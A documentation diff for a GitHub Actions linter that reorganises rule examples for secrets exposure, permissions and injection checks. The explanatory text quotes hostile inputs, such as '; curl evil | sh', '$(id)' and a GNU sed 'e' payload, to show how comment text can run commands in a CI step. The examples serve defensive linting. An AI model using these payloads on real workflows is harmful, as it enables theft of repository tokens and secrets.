+test.yaml:13:15: warning: actions/upload-artifact does not fail by default: the step only warns when "path" matches no file, so a build which produced nothing stays green and the artifact is missing. set "if-no-files-found: error" (the default is "warn") [fail-fast-action-inputs]
    |
-12 |       - uses: actions/upload-artifact@v4
+13 |       - uses: actions/upload-artifact@v4
    |               ^~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:17:15: warning: softprops/action-gh-release does not fail by default: the release is created without the files when a "files" pattern matches nothing. set "fail_on_unmatched_files: true" (the default is "false") [fail-fast-action-inputs]
+test.yaml:18:15: warning: softprops/action-gh-release does not fail by default: the release is created without the files when a "files" pattern matches nothing. set "fail_on_unmatched_files: true" (the default is "false") [fail-fast-action-inputs]
    |
-17 |       - uses: softprops/action-gh-release@v2
+18 |       - uses: softprops/action-gh-release@v2
    |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```
 
@@ -4810,12 +4899,7 @@ test.yaml:17:15: warning: softprops/action-gh-release does not fail by default: 
 
 Some actions pass when the thing they exist for did not happen: `actions/upload-artifact` only warns when its `path` matches no file, `softprops/action-gh-release` creates the release without the `files` that matched nothing, and a test report action passes when it found no test result. A broken build is then green, and nobody notices until the artifact or the release is needed. Each of them has an input that makes it fail, and the rule asks for it. The rule is pedantic because a missing file is sometimes fine and nothing in the workflow says which jobs it is for.
 
-**Configure.** List the rule to enable it without the `pedantic` profile; `warn` is its default level. The output shows only the findings of this rule: `jactionlint --select fail-fast-action-inputs` prints it.
-
-```yaml
-rules:
-  fail-fast-action-inputs: warn
-```
+**Configure.** List the rule under `rules`, as the example config does, to enable it without the `pedantic` profile; `warn` is its default level. The output shows only the findings of this rule: `jactionlint --select fail-fast-action-inputs` prints it.
 
 The table lists the actions, from the `action.yml` of each:
 
@@ -5187,34 +5271,12 @@ A reusable workflow defines its outputs at `on.workflow_call.outputs`, as descri
 
 ### Check inputs and secrets in workflow call
 
-Example reusable workflow:
-
-```yaml
-# .github/workflows/reusable.yaml
-on:
-  workflow_call:
-    inputs:
-      name:
-        type: string
-        required: true
-      id:
-        type: number
-      message:
-        type: string
-    secrets:
-      password:
-        required: true
-
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo '${{ inputs.name }}'
-```
+The example calls the reusable workflow `.github/workflows/reusable.yaml`.
 
 Example input:
 
 ```yaml
+# select: missing-workflow-input,missing-workflow-secret,unknown-workflow-input,unknown-workflow-secret,workflow-input-type
 on: push
 
 jobs:
@@ -5243,33 +5305,56 @@ jobs:
       password: p@ssw0rd
 ```
 
+Example file: .github/workflows/reusable.yaml
+
+```yaml
+on:
+  workflow_call:
+    inputs:
+      name:
+        type: string
+        required: true
+      id:
+        type: number
+      message:
+        type: string
+    secrets:
+      password:
+        required: true
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo '${{ inputs.name }}'
+```
+
 Output:
-<!-- Skip update output -->
 
 ```
-test.yaml:6:11: input "name" is required by "./.github/workflows/reusable.yaml" reusable workflow [missing-workflow-input]
+test.yaml:7:11: input "name" is required by "./.github/workflows/reusable.yaml" reusable workflow [missing-workflow-input]
   |
-6 |     uses: ./.github/workflows/reusable.yaml
+7 |     uses: ./.github/workflows/reusable.yaml
   |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:6:11: secret "password" is required by "./.github/workflows/reusable.yaml" reusable workflow [missing-workflow-secret]
+test.yaml:7:11: secret "password" is required by "./.github/workflows/reusable.yaml" reusable workflow [missing-workflow-secret]
   |
-6 |     uses: ./.github/workflows/reusable.yaml
+7 |     uses: ./.github/workflows/reusable.yaml
   |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:9:7: input "user" is not defined in "./.github/workflows/reusable.yaml" reusable workflow. defined inputs are "id", "message", "name" [unknown-workflow-input]
-  |
-9 |       user: rhysd
-  |       ^~~~~
-test.yaml:13:7: secret "credentials" is not defined in "./.github/workflows/reusable.yaml" reusable workflow. defined secret is "password" [unknown-workflow-secret]
+test.yaml:10:7: input "user" is not defined in "./.github/workflows/reusable.yaml" reusable workflow. defined inputs are "id", "message", "name" [unknown-workflow-input]
    |
-13 |       credentials: my-token
+10 |       user: rhysd
+   |       ^~~~~
+test.yaml:14:7: secret "credentials" is not defined in "./.github/workflows/reusable.yaml" reusable workflow. defined secret is "password" [unknown-workflow-secret]
+   |
+14 |       credentials: my-token
    |       ^~~~~~~~~~~~
-test.yaml:22:11: input "id" is typed as number by reusable workflow "./.github/workflows/reusable.yaml". bool value cannot be assigned [workflow-input-type]
+test.yaml:23:11: input "id" is typed as number by reusable workflow "./.github/workflows/reusable.yaml". bool value cannot be assigned [workflow-input-type]
    |
-22 |       id: true
+23 |       id: true
    |           ^~~~
-test.yaml:24:16: input "message" is typed as string by reusable workflow "./.github/workflows/reusable.yaml". null value cannot be assigned [workflow-input-type]
+test.yaml:25:16: input "message" is typed as string by reusable workflow "./.github/workflows/reusable.yaml". null value cannot be assigned [workflow-input-type]
    |
-24 |       message: null
+25 |       message: null
    |                ^~~~
 ```
 
@@ -5285,10 +5370,30 @@ A call with `secrets: inherit` passes every secret of the caller, so its secrets
 
 ### Check outputs of workflow call in downstream jobs
 
-Example reusable workflow:
+The example calls the reusable workflow `.github/workflows/get-build-info.yaml`.
+
+Example input:
 
 ```yaml
-# .github/workflows/get-build-info.yaml
+# select: undefined-property
+on: push
+
+jobs:
+  get_build_info:
+    uses: ./.github/workflows/get-build-info.yaml
+  downstream:
+    needs: [get_build_info]
+    runs-on: ubuntu-latest
+    steps:
+      # OK. `version` is defined in the reusable workflow
+      - run: echo '${{ needs.get_build_info.outputs.version }}'
+      # ERROR: `tag` is not defined in the reusable workflow
+      - run: echo '${{ needs.get_build_info.outputs.tag }}'
+```
+
+Example file: .github/workflows/get-build-info.yaml
+
+```yaml
 on:
   workflow_call:
     outputs:
@@ -5306,31 +5411,12 @@ jobs:
         id: get_version
 ```
 
-Example input:
-
-```yaml
-on: push
-
-jobs:
-  get_build_info:
-    uses: ./.github/workflows/get-build-info.yaml
-  downstream:
-    needs: [get_build_info]
-    runs-on: ubuntu-latest
-    steps:
-      # OK. `version` is defined in the reusable workflow
-      - run: echo '${{ needs.get_build_info.outputs.version }}'
-      # ERROR: `tag` is not defined in the reusable workflow
-      - run: echo '${{ needs.get_build_info.outputs.tag }}'
-```
-
 Output:
-<!-- Skip update output -->
 
 ```
-test.yaml:13:24: property "tag" is not defined in object type {version: string} [undefined-property]
+test.yaml:14:24: property "tag" is not defined in object type {version: string} [undefined-property]
    |
-13 |       - run: echo '${{ needs.get_build_info.outputs.tag }}'
+14 |       - run: echo '${{ needs.get_build_info.outputs.tag }}'
    |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```
 
@@ -5342,10 +5428,28 @@ This check reads a called workflow of the repository (`./` or `$/`). For a workf
 
 ### Check caller/callee permissions in workflow call
 
-Example reusable workflow:
+The example calls the reusable workflow `.github/workflows/reusable.yaml`.
+
+Example input:
 
 ```yaml
-# .github/workflows/reusable.yaml
+# select: workflow-call-permissions
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  # ERROR: Caller does not grant pull-requests: write but the called job requires it.
+  caller:
+    uses: ./.github/workflows/reusable.yaml
+```
+
+Example file: .github/workflows/reusable.yaml
+
+```yaml
 on:
   workflow_call:
 
@@ -5360,29 +5464,12 @@ jobs:
       - run: echo snapshot
 ```
 
-Example input:
-
-```yaml
-on:
-  push:
-    branches: [main]
-
-permissions:
-  contents: read
-
-jobs:
-  # ERROR: Caller does not grant pull-requests: write but the called job requires it.
-  caller:
-    uses: ./.github/workflows/reusable.yaml
-```
-
 Output:
-<!-- Skip update output -->
 
 ```
-test.yaml:11:11: nested job "snapshot" of "./.github/workflows/reusable.yaml" requires "pull-requests: write" but the calling job grants "pull-requests: none" [workflow-call-permissions]
+test.yaml:12:11: nested job "snapshot" of "./.github/workflows/reusable.yaml" requires "pull-requests: write" but the calling job grants "pull-requests: none" [workflow-call-permissions]
    |
-11 |     uses: ./.github/workflows/reusable.yaml
+12 |     uses: ./.github/workflows/reusable.yaml
    |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```
 
@@ -5482,6 +5569,8 @@ test.yaml:26:23: property "reslt" is not defined in object type {result: string}
 Example input:
 
 ```yaml
+# file: .github/workflows/ci.yml
+# select: concurrency-deadlock
 on: push
 
 # ERROR: the called workflow has the same group
@@ -5494,16 +5583,7 @@ jobs:
     uses: ./.github/workflows/build.yml
 ```
 
-Output:
-<!-- Skip update output -->
-
-```
-.github/workflows/ci.yml:5:10: the concurrency group "${{ github.workflow }}-${{ github.sha }}" is the same as the group of the workflow of .github/workflows/build.yml (line 4), which job "build" calls. the called workflow runs inside this one with its `github` context, so both groups are one: this run holds the group while it waits for the called workflow, which waits for the group. GitHub detects the deadlock and cancels the run. give one of the groups a part of its own, for example a suffix such as "-caller" [concurrency-deadlock]
-```
-
-<!-- Skip playground link -->
-
-The example is `.github/workflows/ci.yml`. The called workflow is `.github/workflows/build.yml`:
+Example file: .github/workflows/build.yml
 
 ```yaml
 on: workflow_call
@@ -5517,6 +5597,19 @@ jobs:
     steps:
       - run: make
 ```
+
+Output:
+
+```
+.github/workflows/ci.yml:7:10: the concurrency group "${{ github.workflow }}-${{ github.sha }}" is the same as the group of the workflow of .github/workflows/build.yml (line 4), which job "build" calls. the called workflow runs inside this one with its `github` context, so both groups are one: this run holds the group while it waits for the called workflow, which waits for the group. GitHub detects the deadlock and cancels the run. give one of the groups a part of its own, for example a suffix such as "-caller" [concurrency-deadlock]
+  |
+7 |   group: ${{ github.workflow }}-${{ github.sha }}
+  |          ^~~
+```
+
+<!-- Skip playground link -->
+
+The example is `.github/workflows/ci.yml`, and the called workflow is `.github/workflows/build.yml`.
 
 The output block shows the first line of the finding only. On the command line, jactionlint prints the quoted line of the group under it, as for every finding.
 
@@ -5538,6 +5631,7 @@ The output block shows the first line of the finding only. On the command line, 
 Example input:
 
 ```yaml
+# select: unused-workflow-input
 on:
   workflow_dispatch:
     inputs:
@@ -5552,12 +5646,19 @@ jobs:
       - run: echo ${{ inputs.version }}
 ```
 
-Output:
-<!-- Skip update output -->
+Example config:
+
+```yaml
+rules:
+  unused-workflow-input: warn
 ```
-test.yaml:6:7: warning: input "dry-run" of "workflow_dispatch" is never used: no expression reads "inputs.dry-run". remove it or use it [unused-workflow-input]
+
+Output:
+
+```
+test.yaml:7:7: warning: input "dry-run" of "workflow_dispatch" is never used: no expression reads "inputs.dry-run". remove it or use it [unused-workflow-input]
   |
-6 |       dry-run:
+7 |       dry-run:
   |       ^~~~~~~~
 ```
 
@@ -5603,8 +5704,15 @@ jobs:
           TOKEN: ${{ secrets.token }}
 ```
 
+Example config:
+
+```yaml
+rules:
+  unused-workflow-secret: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:6:7: warning: secret "npm-token" of "workflow_call" is never used: no expression reads "secrets.npm-token". remove it from the workflow and from the callers, so that nothing passes a credential which is not needed, or use it [unused-workflow-secret]
   |
@@ -5616,12 +5724,7 @@ test.yaml:6:7: warning: secret "npm-token" of "workflow_call" is never used: no 
 
 The output lists only the findings of this rule. To get the same findings for a file of your own, run `jactionlint --select unused-workflow-secret FILE`.
 
-**Configure.** The rule is not in the `default` profile, for the same reason as the inputs: the secret may be passed for a reason that the file does not show. Run `jactionlint --profile pedantic`, or list the rule under `rules` in [the configuration file](./config.md#rules) to enable it at the level you choose (`error`, `warn` or `info`):
-
-```yaml
-rules:
-  unused-workflow-secret: warn
-```
+**Configure.** The rule is not in the `default` profile, for the same reason as the inputs: the secret may be passed for a reason that the file does not show. Run `jactionlint --profile pedantic`, or list the rule under `rules` in [the configuration file](./config.md#rules) to enable it at the level you choose (`error`, `warn` or `info`); the example config of this section is such an entry.
 
 **What is reported.** A secret is read as `secrets.<name>` (names are case-insensitive) or `secrets['<name>']`. A read of the whole context (`toJSON(secrets)`, `secrets[matrix.name]`) counts as a read of every secret, and so does a job that calls another workflow with `secrets: inherit`, which passes every secret on. A workflow in which an expression does not parse is skipped.
 
@@ -5758,8 +5861,15 @@ jobs:
       - run: echo everything
 ```
 
+Example config:
+
+```yaml
+rules:
+  excessive-permissions: error
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:7:3: "contents: write" is granted to every job of the workflow, which lets any of them push commits and tags and create or delete releases. set "permissions: {}" at the workflow level and grant "contents: write" only to the job which needs it [excessive-permissions]
   |
@@ -5779,12 +5889,7 @@ test.yaml:27:18: "write-all" gives the GITHUB_TOKEN write access to every scope 
 
 The output lists only the findings of this rule. To get the same findings for a file of your own, run `jactionlint --select excessive-permissions FILE`.
 
-**Configure.** To set the level of the rule or to turn it off, use [the configuration file](./config.md#rules):
-
-```yaml
-rules:
-  excessive-permissions: error
-```
+**Configure.** To set the level of the rule or to turn it off, use [the configuration file](./config.md#rules); the example config of this section is such an entry.
 
 **What is reported.**
 
@@ -5935,8 +6040,15 @@ jobs:
       - run: echo hello
 ```
 
+Example config:
+
+```yaml
+rules:
+  undocumented-permissions: error
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:4:3: permission "contents: write" has no comment explaining why it is needed. add a comment at the end of the line or above it [undocumented-permissions]
   |
@@ -5952,12 +6064,7 @@ test.yaml:14:7: permission "id-token: write" has no comment explaining why it is
 
 The example runs the rule at the level `error`, so a finding has no level prefix. With the default level, `jactionlint --select undocumented-permissions FILE` prints the same findings, each starting with `info:`.
 
-**Configure.** The rule is not in the `default` profile. Run `jactionlint --profile pedantic`, or list the rule under `rules` in [the configuration file](./config.md#rules) to enable it at the level you choose (`error`, `warn` or `info`):
-
-```yaml
-rules:
-  undocumented-permissions: error
-```
+**Configure.** The rule is not in the `default` profile. Run `jactionlint --profile pedantic`, or list the rule under `rules` in [the configuration file](./config.md#rules) to enable it at the level you choose (`error`, `warn` or `info`); the example config of this section is such an entry.
 
 **What is reported.** A scope counts as documented when a comment is at the end of its line (`issues: write # close stale issues`) or when comment lines are directly above it, with no blank line in between. The comment above `permissions:` does not document the scopes below it. Comments that only configure a tool, such as `# jactionlint ignore=...`, do not explain anything. The rule reports one finding for each scope without a comment, in the `permissions:` of the workflow and of a job.
 
@@ -6004,7 +6111,7 @@ jobs:
 ```
 
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:8:15: no "permission-*" input is set, so the token gets every permission granted to the GitHub App. request only what the job needs, for instance "permission-contents: read" [github-app]
   |
@@ -6157,8 +6264,15 @@ jobs:
           path: other
 ```
 
+Example config:
+
+```yaml
+rules:
+  artipacked: error
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:8:15: actions/checkout leaves the GITHUB_TOKEN in the git config of the workspace, where a later step such as an artifact upload can publish it. set "persist-credentials: false" under "with:" unless a later step needs to push [artipacked]
   |
@@ -6170,12 +6284,7 @@ test.yaml:8:15: actions/checkout leaves the GITHUB_TOKEN in the git config of th
 
 The checkout action stores the `GITHUB_TOKEN` in the git config of the workspace so that later `git` commands can push. Any later step can read it, and a step that copies the workspace, such as `actions/upload-artifact` with `path: .`, publishes it in the artifact (the [ArtiPACKED](https://unit42.paloaltonetworks.com/github-repo-artifacts-leak-tokens/) attack).
 
-**Configure.** The output shows only the findings of this rule; run `jactionlint --select=artipacked` to get the same on your own files. The level of the rule is set under `rules` in the [configuration file](config.md#rules); `error` is the default and `off` turns the rule off:
-
-```yaml
-rules:
-  artipacked: error
-```
+**Configure.** The output shows only the findings of this rule; run `jactionlint --select=artipacked` to get the same on your own files. The level of the rule is set under `rules` in the [configuration file](config.md#rules); `error` is the default and `off` turns the rule off; the example config of this section is such an entry.
 
 **Fix.** Set `persist-credentials: false` unless a later step needs to push. An explicit `persist-credentials: true` says that the credential is needed, so it is not reported, and neither is a value given by an expression.
 
@@ -6253,8 +6362,15 @@ jobs:
           SECRETS: ${{ toJSON(secrets) }}
 ```
 
+Example config:
+
+```yaml
+rules:
+  overprovisioned-secrets: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:8:31: warning: the whole "secrets" context is used, which exposes every secret to the runner even if only one is needed. reference each secret by its name, e.g. "secrets.NAME" [overprovisioned-secrets]
   |
@@ -6267,11 +6383,6 @@ test.yaml:8:31: warning: the whole "secrets" context is used, which exposes ever
 GitHub passes to the runner only the secrets that a job refers to by name. An expression like the one in the example makes it pass all of them, even if the step needs one.
 
 **Configure.** The example sets the level `warn` under `rules` in the [configuration file](config.md#rules), which is why the finding starts with `warning:`; the default level is `error`. To get only the findings of this rule on your own files, run `jactionlint --select=overprovisioned-secrets`.
-
-```yaml
-rules:
-  overprovisioned-secrets: warn
-```
 
 **Fix.** Refer to each secret by its name instead:
 
@@ -6301,8 +6412,15 @@ jobs:
           PASSWORD: ${{ fromJSON(secrets.CREDENTIALS).password }}
 ```
 
+Example config:
+
+```yaml
+rules:
+  unredacted-secrets: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:8:25: warning: secret "CREDENTIALS" is parsed with fromJSON(), and the runner does not redact the fields of a parsed secret from the logs. store each field in its own secret and reference it by name [unredacted-secrets]
   |
@@ -6315,11 +6433,6 @@ test.yaml:8:25: warning: secret "CREDENTIALS" is parsed with fromJSON(), and the
 The runner redacts the exact value of each secret from the logs, but it does not know that a field of a JSON document is a secret too, so the extracted value can show up in the logs in clear.
 
 **Configure.** The example sets the level `warn` under `rules` in the [configuration file](config.md#rules), which is why the finding starts with `warning:`; the default level is `error`. To get only the findings of this rule on your own files, run `jactionlint --select=unredacted-secrets`.
-
-```yaml
-rules:
-  unredacted-secrets: warn
-```
 
 **Fix.** Store each field in its own secret (`secrets.CREDENTIALS_PASSWORD`). Passing the whole parsed secret on (`fromJSON(secrets.X)` without a property access) is not reported. There is no automatic fix.
 
@@ -6342,8 +6455,16 @@ jobs:
           CREDENTIALS: ${{ secrets.CREDENTIALS }}
 ```
 
+Example config:
+
+```yaml
+rules:
+  unredacted-secrets:
+    pedantic: true
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:8:11: the variable "KEY" is extracted from the secret CREDENTIALS with jq and printed here. the runner masks only the exact value of a secret, not a part of it, so the value is in the log in clear text. mask it first with `echo "::add-mask::$VALUE"` [unredacted-secrets]
   |
@@ -6353,13 +6474,7 @@ test.yaml:8:11: the variable "KEY" is extracted from the secret CREDENTIALS with
 
 <!-- Skip playground link -->
 
-The option is set for the rule in the [configuration file](config.md#rules):
-
-```yaml
-rules:
-  unredacted-secrets:
-    pedantic: true
-```
+The option is set for the rule in the [configuration file](config.md#rules); the example config of this section is such an entry.
 
 The runner masks a secret in the log by its exact value. `jq -r .private_key` makes a different string, which the runner does not know, and `echo` (or the trace of `set -x`) writes it in clear text. The rule follows the variables of one `run:` script in the order of the source:
 
@@ -6400,8 +6515,15 @@ jobs:
           API_KEY: ${{ secrets.API_KEY }}
 ```
 
+Example config:
+
+```yaml
+rules:
+  secrets-outside-env: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:8:24: warning: secret "API_KEY" is used by a job which has no "environment:", so it is a repository or organization secret exposed to every job. move it to an environment with protection rules and set "environment:" at the job [secrets-outside-env]
   |
@@ -6411,12 +6533,7 @@ test.yaml:8:24: warning: secret "API_KEY" is used by a job which has no "environ
 
 <!-- Skip playground link -->
 
-**Configure.** The rule is off under the `default` profile. Run it with `--profile pedantic`, with `--select=secrets-outside-env`, or turn it on for this rule alone under `rules` in the [configuration file](config.md#rules):
-
-```yaml
-rules:
-  secrets-outside-env: warn
-```
+**Configure.** The rule is off under the `default` profile. Run it with `--profile pedantic`, with `--select=secrets-outside-env`, or turn it on for this rule alone under `rules` in the [configuration file](config.md#rules); the example config of this section is such an entry.
 
 Secrets of a repository or an organization are exposed to every job that asks for them. The secrets of an [environment](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment) are only available to jobs that meet its protection rules (required reviewers, branch restrictions), which limits the damage of a compromised workflow.
 
@@ -6465,8 +6582,15 @@ jobs:
       - run: ./deploy.sh
 ```
 
+Example config:
+
+```yaml
+rules:
+  workflow-secret-scope: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:3:21: warning: secret "DEPLOY_TOKEN" is assigned to the workflow-level env "DEPLOY_TOKEN", so it reaches 2 jobs. set it at the job or the step that needs it instead [workflow-secret-scope]
   |
@@ -6476,12 +6600,7 @@ test.yaml:3:21: warning: secret "DEPLOY_TOKEN" is assigned to the workflow-level
 
 <!-- Skip playground link -->
 
-**Configure.** The rule is off under the `default` profile. Run it with `--profile pedantic`, with `--select=workflow-secret-scope`, or turn it on for this rule alone under `rules` in the [configuration file](config.md#rules):
-
-```yaml
-rules:
-  workflow-secret-scope: warn
-```
+**Configure.** The rule is off under the `default` profile. Run it with `--profile pedantic`, with `--select=workflow-secret-scope`, or turn it on for this rule alone under `rules` in the [configuration file](config.md#rules); the example config of this section is such an entry.
 
 Every step of the jobs that the secret reaches can read it, including third-party actions.
 
@@ -6889,6 +7008,7 @@ The option is on under the `pedantic` profile and off otherwise, and you can set
 Example input:
 
 ```yaml
+# select: template-injection
 on: workflow_dispatch
 
 jobs:
@@ -6907,19 +7027,24 @@ jobs:
       - run: echo "Building ${{ github.repository }}"
 ```
 
+Example config:
+
+```yaml
+rules:
+  template-injection:
+    pedantic: true
+```
+
 Output:
 
-The output is with the option `pedantic` of `template-injection` on.
-
-<!-- Skip update output -->
 ```
-test.yaml:10:32: "steps.version.outputs.tag" is expanded with ${{ }} into an inline script, so a value with shell syntax changes what the script does. instead, pass it through an environment variable and read it as a variable of the shell [template-injection]
+test.yaml:11:32: "steps.version.outputs.tag" is expanded with ${{ }} into an inline script, so a value with shell syntax changes what the script does. instead, pass it through an environment variable and read it as a variable of the shell [template-injection]
    |
-10 |       - run: ./release.sh '${{ steps.version.outputs.tag }}'
+11 |       - run: ./release.sh '${{ steps.version.outputs.tag }}'
    |                                ^~~~~~~~~~~~~~~~~~~~~~~~~
-test.yaml:16:33: "github.repository" is expanded with ${{ }} into an inline script. its value is not controlled by an attacker, but an expansion in a script is easy to get wrong when the script changes. instead, read it as a variable of the shell [template-injection]
+test.yaml:17:33: "github.repository" is expanded with ${{ }} into an inline script. its value is not controlled by an attacker, but an expansion in a script is easy to get wrong when the script changes. instead, read it as a variable of the shell [template-injection]
    |
-16 |       - run: echo "Building ${{ github.repository }}"
+17 |       - run: echo "Building ${{ github.repository }}"
    |                                 ^~~~~~~~~~~~~~~~~
 ```
 
@@ -7021,8 +7146,15 @@ jobs:
           BODY: ${{ github.event.comment.body }}
 ```
 
+Example config:
+
+```yaml
+rules:
+  command-injection: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:8:14: warning: untrusted input from the variable BODY (github.event.comment.body) is expanded into the command string of "bash -c", which the shell then parses as code: a value with shell syntax (a ;, a quote or $(...)) runs commands in this step. pass the value as an argument of the command string instead (bash -c 'cmd "$1"' _ "$VALUE"), or validate it against a fixed list or a strict pattern first [command-injection]
   |
@@ -7032,12 +7164,7 @@ test.yaml:8:14: warning: untrusted input from the variable BODY (github.event.co
 
 <!-- Skip playground link -->
 
-The output keeps only the findings of this rule: `--select command-injection` gives the same findings on a file with the same content. To enable the rule without the `pedantic` profile, list it in `rules` of the [configuration file](./config.md#rules):
-
-```yaml
-rules:
-  command-injection: warn
-```
+The output keeps only the findings of this rule: `--select command-injection` gives the same findings on a file with the same content. To enable the rule without the `pedantic` profile, list it in `rules` of the [configuration file](./config.md#rules); the example config of this section is such an entry.
 
 The usual advice for [template injection](#untrusted-inputs) is to pass the input to the script through `env:` and to read it as `"$BODY"`. That is safe while the shell only expands the variable, and it is not when the script parses the value again. `bash -c "echo $BODY"` builds the command string first and lets a second shell read it, so a comment with `; curl evil | sh` or `$(id)` runs commands in the step, with the token and the secrets of the job. The same holds for `eval "$BODY"`, which runs the value itself. See CodeQL's [command injection query](https://github.com/github/codeql/blob/main/actions/ql/src/experimental/Security/CWE-078/CommandInjectionCritical.ql).
 
@@ -7075,6 +7202,7 @@ The rule `output-clobbering` (pedantic profile) reports input that an outsider c
 Example input:
 
 ```yaml
+# select: output-clobbering
 on:
   issue_comment:
     types: [created]
@@ -7092,12 +7220,19 @@ jobs:
           BODY: ${{ github.event.comment.body }}
 ```
 
-Output:
-<!-- Skip update output -->
+Example config:
+
+```yaml
+rules:
+  output-clobbering: warn
 ```
-test.yaml:13:29: warning: untrusted input from the variable BODY (github.event.comment.body) is written to $GITHUB_OUTPUT as the record "body=..." and can hold a line break: an attacker who controls it ends the record and adds others, so it sets the other outputs of the step (steps.gate.outputs.*) that later steps trust. write a value without line breaks (validate it, or cut it down with tr -d '\n'), or write it between a delimiter that nobody can guess (delimiter=$(uuidgen); echo "body<<$delimiter" ...; echo "$delimiter") [output-clobbering]
+
+Output:
+
+```
+test.yaml:14:29: warning: untrusted input from the variable BODY (github.event.comment.body) is written to $GITHUB_OUTPUT as the record "body=..." and can hold a line break: an attacker who controls it ends the record and adds others, so it sets the other outputs of the step (steps.gate.outputs.*) that later steps trust. write a value without line breaks (validate it, or cut it down with tr -d '\n'), or write it between a delimiter that nobody can guess (delimiter=$(uuidgen); echo "body<<$delimiter" ...; echo "$delimiter") [output-clobbering]
    |
-13 |           echo "body=$BODY" >> "$GITHUB_OUTPUT"
+14 |           echo "body=$BODY" >> "$GITHUB_OUTPUT"
    |                             ^~~~~~~~~~~~~~~~~~~
 ```
 
@@ -7162,8 +7297,15 @@ jobs:
           BODY: ${{ github.event.comment.body }}
 ```
 
+Example config:
+
+```yaml
+rules:
+  argument-injection: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:8:14: warning: free text of an outsider from the variable BODY (github.event.comment.body) is expanded into the program of sed: a value with a slash ends the command and the rest is a program of its own. GNU sed runs commands with `e` (`a/g;1e id;#`) and writes files with `w`. keep the value out of the program text: read it from the environment in awk (ENVIRON["BODY"]) or perl ($ENV{BODY}), or cut it down to letters and digits first [argument-injection]
   |
@@ -7173,12 +7315,7 @@ test.yaml:8:14: warning: free text of an outsider from the variable BODY (github
 
 <!-- Skip playground link -->
 
-The output keeps only the findings of this rule: `--select argument-injection` gives the same findings on a file with the same content. To enable the rule without the `pedantic` profile, list it in `rules` of the [configuration file](./config.md#rules):
-
-```yaml
-rules:
-  argument-injection: warn
-```
+The output keeps only the findings of this rule: `--select argument-injection` gives the same findings on a file with the same content. To enable the rule without the `pedantic` profile, list it in `rules` of the [configuration file](./config.md#rules); the example config of this section is such an entry.
 
 Passing the input through `env:` makes `"$BODY"` safe as an argument, but not as part of the program that a command reads. In `sed "s/PLACEHOLDER/$BODY/g"` a slash in the value ends the `s` command and the rest is a program of its own: GNU sed runs a command with the `e` command and the `e` flag (`a/g;1e id;#`) and writes files with `w`. The program of `awk` can call `system()`.
 
@@ -7322,8 +7459,15 @@ jobs:
       - run: echo hello
 ```
 
+Example config:
+
+```yaml
+rules:
+  dangerous-triggers: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:2:3: warning: trigger "pull_request_target" is dangerous: it runs in the context of the base repository with the default token of the repository (it can write unless the settings of the repository restrict it) and no secrets, even when the pull request comes from a fork. use "pull_request" unless write access is required, and never check out or run code of the pull request [dangerous-triggers]
   |
@@ -7333,12 +7477,7 @@ test.yaml:2:3: warning: trigger "pull_request_target" is dangerous: it runs in t
 
 <!-- Skip playground link -->
 
-The output keeps only the findings of this rule, at the level `warn` that this `rules` section of the [configuration file](./config.md#rules) sets (the default level of the rule is `error`). `--select dangerous-triggers` with that configuration gives the same findings on a file with the same content:
-
-```yaml
-rules:
-  dangerous-triggers: warn
-```
+The output keeps only the findings of this rule, at the level `warn` that the `rules` section of the example config, which is an entry of the [configuration file](./config.md#rules) sets (the default level of the rule is `error`). `--select dangerous-triggers` with that configuration gives the same findings on a file with the same content.
 
 Making these triggers safe is hard: it is not enough to avoid checking out the pull request, because arguments, environment variables and files that come from the event can still lead to code execution. See [Keeping your GitHub Actions and workflows secure: preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/).
 
@@ -7388,8 +7527,15 @@ jobs:
           TOKEN: ${{ secrets.DEPLOY_TOKEN }}
 ```
 
+Example config:
+
+```yaml
+rules:
+  comment-trigger-authorization: warn
+```
+
 Output:
-<!-- Skip update output -->
+
 ```
 test.yaml:7:9: warning: this condition starts the job from the text of a comment (the event is "issue_comment"), and nothing checks who wrote it, so anyone who can comment can run the job with the token and the secrets of the repository. check github.event.comment.author_association (OWNER, MEMBER or COLLABORATOR), ask for the permission of github.actor in an earlier step or job, or run the job in an environment with required reviewers [comment-trigger-authorization]
   |
@@ -7403,12 +7549,7 @@ A command bot starts a job from a comment (`/deploy`, `/test`, `@bot run`). The 
 
 **Fix.** Check the commenter before the job does any work. Compare `github.event.comment.author_association` with `OWNER`, `MEMBER` or `COLLABORATOR`, ask for the permission of `github.actor` in an earlier step or job, or run the job in an environment with required reviewers. There is no automatic fix.
 
-**Configure.** The rule is off under the `default` profile. Run it with `--profile pedantic`, with `--select=comment-trigger-authorization` (which also runs a rule that the profile does not enable), or turn it on for this rule alone under `rules` in the [configuration file](config.md#rules):
-
-```yaml
-rules:
-  comment-trigger-authorization: warn
-```
+**Configure.** The rule is off under the `default` profile. Run it with `--profile pedantic`, with `--select=comment-trigger-authorization` (which also runs a rule that the profile does not enable), or turn it on for this rule alone under `rules` in the [configuration file](config.md#rules); the example config of this section is such an entry.
 
